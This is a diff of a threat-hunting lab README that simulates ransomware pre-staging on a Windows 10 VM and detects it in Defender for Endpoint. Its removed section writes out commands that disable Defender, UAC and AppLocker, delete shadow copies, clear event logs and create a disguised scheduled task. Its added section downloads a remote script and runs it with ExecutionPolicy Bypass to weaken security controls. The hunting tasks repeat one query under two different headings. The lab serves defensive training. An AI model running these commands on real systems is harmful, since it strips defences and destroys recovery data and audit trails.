@@ -1,192 +1,150 @@
-# Threat-Hunting Scenario: Ransomware Pre-Staging Activity (Windows 10 / Azure)
-
-## Overview
-
-This playbook walks through **simulating** and **detecting** the techniques that modern ransomware operators (e.g., BlackCat, LockBit 3.0) use *weeks* before detonation: systematically weakening host‑level security controls.
-The end goal is to validate that Microsoft **Defender for Endpoint (MDE)** surfaces the right telemetry so that the SOC can hunt and respond *before* encryption.
-
-> **Why this matters**: FS‑ISAC reporting (March 2025) shows affiliates spending **2–3 weeks** disabling Windows protections across finance‑sector victims before dropping their payloads.
+# LogN Pacific – Crimson Mongoose Ransomware Pre-Staging Hunt  
+_Single-VM exercise for the Josh Madakor Cyber Range – **Defender-only hunting**_
 
 ---
 
-## Hypothesis
+## Background Story – LogN Pacific vs. “Crimson Mongoose”
 
-If an attacker is preparing a ransomware campaign, we will observe **STIG‑defined mis‑configurations** and classic “pre‑ransomware” behaviors such as:
+LogN Pacific keeps 42 ports humming across the Asia-Pacific region.  
+Yesterday the CISO received a CERT flash: a new ransomware crew nick-named **“Crimson Mongoose”** is actively breaching logistics firms just like LogN Pacific.
 
-1. Disabling Microsoft Defender components
-2. Turning off audit logging & recovery features
-3. Clearing event logs
-   These actions should be visible in MDE Advanced Hunting and, optionally, forwarded to Microsoft Sentinel.
+### What investigators know so far
 
----
+| Stage | Details |
+|-------|---------|
+| **Initial access** | Highly tailored spear-phish to high-privilege users (domain admins, SCCM operators, Azure AD Global Admins). |
+| **Immediate action** | Within minutes of foothold the intruders flip **_exactly ten_ Windows 10 STIG settings** from compliant to non-compliant. |
+| **Dwell time** | They lie low for **up to 24 hours**, monitoring Defender noise to stay invisible. |
+| **Impact** | A custom Go-based encryptor detonates after the 24-hour mark, crippling operations and demanding an eight-figure ransom. |
 
-## Lab Environment
+These ten STIG mis-configurations all **erase visibility or weaken host defenses**, PowerShell logging, UAC hardening, SMB & WinRM security, FIPS crypto, and more. In every confirmed Crimson Mongoose incident the same ten flips appeared, no more, no less, making them the most reliable early-warning indicator.
 
-| Component           | Details                                                                                                    |
-| ------------------- | ---------------------------------------------------------------------------------------------------------- |
-| **Cloud**           | Azure subscription (any tier)                                                                              |
-| **Host**            | 1 × Windows 10 Enterprise 21H2 VM (no domain join required)                                                |
-| **Access**          | Local Administrator                                                                                        |
-| **Security stack**  | Microsoft Defender for Endpoint (latest), optional Sysmon for extra telemetry                              |
-| **Log destination** | MDE portal; devices are already onboarded. Sentinel is available but **hunting will be performed in MDE**. |
+### Your threat-hunting mission
 
-> ⚠️ **No domain controller is needed.** All registry and policy tweaks are performed locally on the single VM.
+> **Use Microsoft Defender for Endpoint Advanced Hunting to detect _all ten_ STIG flips on the single Windows 10 victim VM, tie them to the same privileged account, and escalate before the 24-hour fuse burns down.**
 
----
-
-## Step 1 – Baseline the VM
-
-1. **Snapshot** the clean state.
-2. Ensure **PowerShell script‑block logging** is **ON**
-   `Set-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 1 -Type DWord -Force`
-3. Confirm **Microsoft Defender** real‑time protection is **ON** and cloud‑delivered protection is enabled.
-4. Enable recommended **Audit Policy** settings (STIG) with `auditpol /set` or LGPO.
-5. Validate that the VM is reporting into **MDE**.
+Catch the mis-configurations in time and LogN Pacific’s cargo keeps moving; miss them and Crimson Mongoose will lock every manifest and invoice behind an eight-figure ransom demand.
 
 ---
 
-## Step 2 – Simulate Pre‑Staging Techniques
+## 2 Tools in Scope
 
-> Run the following commands **as Administrator**. Wait \~2 minutes between groups to mimic realistic dwell time.
+| Tool | Role in this exercise |
+|------|-----------------------|
+| **Microsoft Defender for Endpoint** | **Only hunting console** (Advanced Hunting queries, timeline, isolation). |
+| **Tenable** | *Instructor-only* baseline check (not used by learner). |
+| **Azure VM** | Single Windows 10 **victim host** running the MDE sensor. |
 
-### Phase A – Security‑Control Degradation (10 STIG Violations)
+---
 
-| #  | Technique                                      | STIG ID          | Command                                                                       |
-| -- | ---------------------------------------------- | ---------------- | ----------------------------------------------------------------------------- |
-| 1  | Disable PUA protection                         | `WNDF-AV-000001` | `Set-ItemProperty -Path "HKLM:\...\MpEngine" -Name MpEnablePus -Value 0`      |
-| 2  | Disable script‑block logging                   | `WN10-CC-000326` | `Set-ItemProperty HKLM:\...\ScriptBlockLogging EnableScriptBlockLogging 0`    |
-| 3  | Disable UAC (Admin Approval Mode)              | `WN10-SO-000270` | `Set-ItemProperty HKLM:\...\Policies\System EnableLUA 0`                      |
-| 4  | Auto‑deny elevation prompts                    | `WN10-SO-000255` | `Set-ItemProperty HKLM:\...\Policies\System ConsentPromptBehaviorUser 0`      |
-| 5  | Disable installer detection                    | `WN10-SO-000260` | `Set-ItemProperty HKLM:\...\Policies\System EnableInstallerDetection 0`       |
-| 6  | Weaken RDP encryption                          | `WN10-CC-000290` | `Set-ItemProperty HKLM:\...\Terminal Services MinEncryptionLevel 1`           |
-| 7  | Stop auditing *Credential Validation* failures | `WN10-AU-000005` | `auditpol /set /subcategory:"Credential Validation" /failure:disable`         |
-| 8  | Stop auditing *Credential Validation* success  | `WN10-AU-000010` | `auditpol /set /subcategory:"Credential Validation" /success:disable`         |
-| 9  | Disable Defender real‑time protection          | `WNDF-AV-000021` | `Set-ItemProperty HKLM:\...\Real-Time Protection DisableRealtimeMonitoring 1` |
-| 10 | Remove AppLocker policies                      | `WN10-00-000035` | `Remove-Item HKLM:\...\SrpV2 -Recurse -Force`                                 |
+## 3 Lab Topology
 
-### Phase B – Classic Ransomware Preparation
+Internet Phish → Victim Win10 VM (Azure)
+▲ Defender for Endpoint sensor
+Hunter (browser) ────┘ security.microsoft.com (Advanced Hunting)
+
+
+---
+
+## 4 Lab Setup (Instructor)
 
 ```powershell
-# Delete shadow copies
-vssadmin delete shadows /all /quiet
+# 1. Restore STIG compliance (baseline)
+iwr "https://raw.githubusercontent.com/kevlo-cyber/threat-hunting-scenario-ransomware-pre-staging-activity/main/scripts/stig-remediation.ps1" -OutFile "$env:TMP\stig-remediation.ps1"
+powershell -ExecutionPolicy Bypass -File "$env:TMP\stig-remediation.ps1"
 
-# Disable System Restore
-Disable-ComputerRestore -Drive "C:"
+# (Instructor may verify with Tenable scan here.)
 
-# Turn off Windows Recovery Environment
-bcdedit /set {default} recoveryenabled no
-bcdedit /set {default} bootstatuspolicy ignoreallfailures
-
-# Persistence – fake Windows Update task
-$action  = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command Write-Host 'Beacon'"
-$trigger = New-ScheduledTaskTrigger -Daily -At 09:00
-Register-ScheduledTask -TaskName "WindowsUpdateHelper" -Action $action -Trigger $trigger -RunLevel Highest
-
-# Wipe security logs
-wevtutil cl Security
-wevtutil cl System
-wevtutil cl Application
 ```
 
----
+Learners begin after this baseline is set.
 
-## Step 3 – Hunt in Defender for Endpoint
+## 5 Inject the IOCs (Attacker script)
 
-### 3.1 Key Telemetry Tables
+iwr "https://raw.githubusercontent.com/kevlo-cyber/threat-hunting-scenario-ransomware-pre-staging-activity/main/scripts/stig-pre-staging-iocs.ps1" -OutFile "$env:TMP\stig-pre-staging-iocs.ps1"
+powershell -ExecutionPolicy Bypass -File "$env:TMP\stig-pre-staging-iocs.ps1"
 
-| Table                  | Use                                                           |
-| ---------------------- | ------------------------------------------------------------- |
-| `DeviceRegistryEvents` | Track security‑relevant registry changes                      |
-| `DeviceProcessEvents`  | Process creation (e.g., `vssadmin`, `bcdedit`)                |
-| `DeviceEvents`         | Security log clear, audit policy change (Event ID 1102, 4719) |
+That flips these ten STIG controls:
 
-### 3.2 Advanced‑Hunting Queries
+#	Mis-configuration	STIG ID
+1	PS transcription OFF	WN10-CC-000327
+2	Script-block logging OFF	WN10-CC-000326
+3	Admin Approval Mode OFF	WN10-SO-000245
+4	Secure-desktop UAC prompt OFF	WN10-SO-000250
+5	Process-Creation success auditing OFF	WN10-AU-000050
+6	SMB client signing OFF	WN10-SO-000100
+7	SMB server signing OFF	WN10-SO-000120
+8	WinRM Digest auth ON	WN10-CC-000360
+9	WinRM unencrypted traffic ON	WN10-CC-000335
+10	FIPS mode OFF	WN10-SO-000230
 
-**Registry changes touching security controls**
+## 6 Adversary Timeline (context)
+(Rows after Hour 0 are hypothetical encryption will not run in this lab.)
 
-```kusto
-DeviceRegistryEvents
-| where RegistryKey has_any (
-      @"\\Windows Defender\\",
-      @"\\Policies\\System",
-      @"\\Terminal Services")
-| summarize count() by DeviceName, InitiatingProcessAccountName, RegistryKey, RegistryValueName, bin(Timestamp, 1h)
-| order by Timestamp desc
-```
+Hour	Action	MDE telemetry
+0	Runs mis-config script.	ProcessCreationEvents for reg.exe / auditpol.exe / powershell.exe
+RegistryEvents with the ten key paths.
+1-23	Quiet recon.	Occasional whoami, Defender device heartbeat.
+23	Drops encryptor.	New file in %PROGRAMDATA%, ProcessCreationEvents.
+23.5	Deletes shadow copies.	ProcessCreationEvents vssadmin.exe.
+24	Schedules encryptor.	Task scheduler events (not executed here).
 
-**Audit policy modifications**
+IR is triggered only after all ten STIG flips are verified.
 
-```kusto
-DeviceEvents
-| where ActionType == "AuditPolicyChanged"
-| project Timestamp, DeviceName, InitiatingProcessFileName, AdditionalFields
-```
+## 7 Hunting Tasks (Defender Advanced Hunting)
 
-**Shadow copy deletion & recovery sabotage**
+1. Find the registry flips
 
-```kusto
-DeviceProcessEvents
-| where FileName in~ ("vssadmin.exe", "bcdedit.exe")
-| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessAccountName
-```
+RegistryEvents
+| where Timestamp > ago(24h)
+| where (
+    RegistryKey has @"\PowerShell\Transcription" and RegistryValueName == "EnableTranscripting" and RegistryValueData == "0"
+    or RegistryKey has @"\PowerShell\ScriptBlockLogging" and RegistryValueData == "0"
+    or RegistryKey has @"\FipsAlgorithmPolicy" and RegistryValueData == "0"
+    or RegistryKey has @"\WinRM\Client"     and RegistryValueName == "AllowDigest"
+    or RegistryKey has @"\WinRM\Client"     and RegistryValueName == "AllowUnencryptedTraffic"
+    or RegistryKey has @"\WinRM\Service"    and RegistryValueName == "AllowUnencryptedTraffic"
+    or RegistryKey has @"\LanmanWorkstation" and RegistryValueName == "RequireSecuritySignature" and RegistryValueData == "0"
+    or RegistryKey has @"\LanmanServer"      and RegistryValueName == "RequireSecuritySignature" and RegistryValueData == "0"
+    or RegistryKey has @"\Policies\System"   and RegistryValueName in ("FilterAdministratorToken","ConsentPromptBehaviorAdmin")
+  )
 
-> 📌 **Optional**: Stream `Device*` tables to **Microsoft Sentinel** with the built‑in connector for centralized hunting.
+2. Correlate to the modifying process & account
 
----
+DeviceNetworkEvents
+| where Timestamp > ago(24h)
+| where RemotePort == 5985 and Protocol == "TCP"   // WinRM HTTP
+  or (Protocol == "SMB" and SmbIsSigned == false)  // Unsigned SMB
 
-## MITRE ATT\&CK Mapping
+3. Network clues – Defender network sensor:
 
-| Tactic          | Technique (sub‑ID)                           | Evidence in Lab                    |
-| --------------- | -------------------------------------------- | ---------------------------------- |
-| Defense Evasion | T1562.001 *Impair Defenses*                  | Disable Defender & AppLocker       |
-| Defense Evasion | T1112 *Modify Registry*                      | All STIG registry edits            |
-| Discovery       | T1087.002 *Domain Account Discovery (Local)* | N/A (single host)                  |
-| Impact          | T1490 *Inhibit System Recovery*              | Shadow copies deletion, RE disable |
-| Defense Evasion | T1070.001 *Clear Windows Event Logs*         | `wevtutil cl`                      |
+DeviceNetworkEvents
+| where Timestamp > ago(24h)
+| where RemotePort == 5985 and Protocol == "TCP"   // WinRM HTTP
+  or (Protocol == "SMB" and SmbIsSigned == false)  // Unsigned SMB
 
----
+4. Validate that all ten controls are flipped; only then escalate.
 
-## Success Criteria
+## 8 Success Criteria
+Tier	Requirement
+Bronze	Use MDE queries to list all ten non-compliant settings.
+Silver	Show the exact privileged account & timestamp for each flip.
+Gold	Create an MDE custom detection rule that fires after all ten flips (AND logic).
+Platinum	Use Defender to isolate the VM or disable the compromised account before hour 24.
 
-* **≥ 10** STIG‑defined mis‑configurations are detected in MDE.
-* Shadow copy deletion and boot‑config tampering generate alerts or query matches.
-* SOC analysts can build an incident timeline from MDE telemetry *without* relying solely on Defender alerts.
+## 9 Cleanup
+The VM will be deleted after the exercise, so remediation is optional.
+(Optional) rerun stig-remediation.ps1 for practice.
 
----
+## 10 References
+DISA Windows 10 STIG v2r9
 
-## Cleanup
+MITRE ATT&CK v14
 
-1. Revert to the **baseline snapshot** or run the provided `Reset-Config.ps1` script (not included) to re‑enable all protections.
-2. Confirm the VM once again reports healthy to MDE.
+Defender for Endpoint Advanced Hunting docs
 
----
+Josh Madakor Cyber Range – https://joshmadakor.tech/cyber/
 
-## Further Improvements
+Kevin Lopez – LinkedIn · GitHub
 
-* Import Sysmon for richer process‑tree context.
-* Extend to a multi‑VM, domain‑joined lab for lateral‑movement detection.
-* Use **Azure Logic Apps** to auto‑notify when queries return hits.
-
----
-
-## Created By:
-- **Author Name**: Kevin Lopez
-- **Author Contact**: https://www.linkedin.com/in/kevlo-cyber/
-- **Date**: June 13, 2025
-
-## Validated By:
-- **Reviewer Name**: 
-- **Reviewer Contact**: 
-- **Validation Date**: 
-
----
-
-## Additional Notes:
-- **None**
-
----
-
-## Revision History:
-| **Version** | **Changes**                   | **Date**         | **Modified By**   |
-|-------------|-------------------------------|------------------|-------------------|
-| 1.0         | Initial draft                  | `June  13, 2025`  | `Kevin Lopez`   
+“Validate every flip, correlate every account, then pull the isolation trigger before the fuse burns down.”
